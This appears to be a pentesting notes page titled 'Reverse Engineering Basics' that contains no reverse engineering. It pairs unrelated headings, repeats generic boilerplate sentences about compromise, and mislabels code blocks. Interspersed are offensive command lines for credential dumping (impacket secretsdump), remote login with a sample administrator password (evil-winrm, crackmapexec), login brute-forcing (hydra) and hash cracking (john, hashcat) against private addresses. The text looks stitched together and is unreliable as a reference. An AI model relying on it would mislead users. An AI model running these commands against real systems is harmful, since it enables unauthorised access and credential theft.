---
TitleSEO: "Reverse Engineering Basics | ZureFX"
TitlePost: "Reverse Engineering Basics"
Author: "ZureFX"
Description: "Personal notes on Reverse Engineering Basics. Quick reference for pentesting and CTF challenges."
Keywords: "enumeration, privilege escalation, lateral movement, linux"
URL: "https://zurefx.github.io/notes/note-reverse-engineering-basics-407.html"
URL_IMAGES: ""
Date: "2025-09-02"
Tags: "Enumeration, Privilege Escalation, Lateral Movement, Linux"
Section: "notes"
Lang: "en"
main_img: "note-reverse-engineering-basics-407"
Permalink: "/notes/note-reverse-engineering-basics-407.html"
BtnLabel: "Read Notes"
Pick: 0
---
## Path Traversal

### MSSQL

Post-exploitation enumeration revealed a path to domain administrator privileges. Weak file permissions allowed modification of critical system files. Authentication bypass was achieved through careful manipulation of the login mechanism. The service was running without proper input validation, leading to injection vulnerabilities.

Unconstrained delegation was enabled on the compromised machine. Privilege escalation was possible due to misconfigured sudo permissions. The target system was identified as running a vulnerable version of the service. Initial enumeration revealed several interesting open ports on the target. Authentication bypass was achieved through careful manipulation of the login mechanism.

Initial enumeration revealed several interesting open ports on the target. The target system was identified as running a vulnerable version of the service. Initial enumeration revealed several interesting open ports on the target. Lateral movement was facilitated by reusing discovered credentials across services.

## impacket

### PostgreSQL

- `SeImpersonatePrivilege`
- `secretsdump`
- `GetNPUsers`
- `Pass the Ticket`
- `Unquoted Service Path`
- `kerbrute`

The backup files contained sensitive information that should not have been accessible. Group Policy Preferences contained encrypted but recoverable credentials.

```python
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Authentication bypass was achieved through careful manipulation of the login mechanism. The kernel version was outdated and vulnerable to a publicly known exploit. Unconstrained delegation was enabled on the compromised machine. The backup files contained sensitive information that should not have been accessible. Initial enumeration revealed several interesting open ports on the target.

## Ruby on Rails

### XXE

The database credentials were hardcoded in the application source code. The application stored sensitive credentials in an unencrypted configuration file. The service account had excessive permissions assigned in Active Directory. Initial enumeration revealed several interesting open ports on the target. The application stored sensitive credentials in an unencrypted configuration file.

- `chisel`
- `netcat`
- `atexec`
- `GPP Password`

- `chisel`
- `john`
- `LXD Privilege Escalation`

```bash
crackmapexec smb 10.64.139.172 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.11.121.228 -u administrator -p 'P@ssw0rd!' --shares
```

## smbexec

### crackmapexec

```powershell
gobuster dir -u http://10.90.179.104/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.53.142.11 -u administrator -p 'P@ssw0rd!'
```

```bash
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.85.225.160
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```python
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.72.105.100 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.49.178.248
```

```powershell
feroxbuster -h
evil-winrm -i 10.15.211.89 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Active Directory

### HTTP

Privilege escalation was possible due to misconfigured sudo permissions. The service was running without proper input validation, leading to injection vulnerabilities. The database credentials were hardcoded in the application source code. Authentication bypass was achieved through careful manipulation of the login mechanism.

> **Note:** DLL Hijacking was identified as the primary attack vector in this scenario.

Group Policy Preferences contained encrypted but recoverable credentials. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
gobuster dir -u http://10.29.172.61/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nmap -sCV -p9200,587,3389 10.22.88.233 -oN scan.txt
gobuster dir -u http://10.31.206.243/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.80.155.149 -u administrator -p 'P@ssw0rd!' --shares
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Lateral movement was facilitated by reusing discovered credentials across services. Token impersonation allowed elevation to SYSTEM privileges on the target. The scheduled task ran with elevated privileges and could be abused for escalation. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Command Injection

### Django

```bash
nmap -sCV -p995,110,21 10.82.220.139 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

> **Note:** Docker Escape was identified as the primary attack vector in this scenario.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.104.88.218
crackmapexec smb 10.121.70.108 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The target system was identified as running a vulnerable version of the service. The service was running without proper input validation, leading to injection vulnerabilities. The scheduled task ran with elevated privileges and could be abused for escalation.
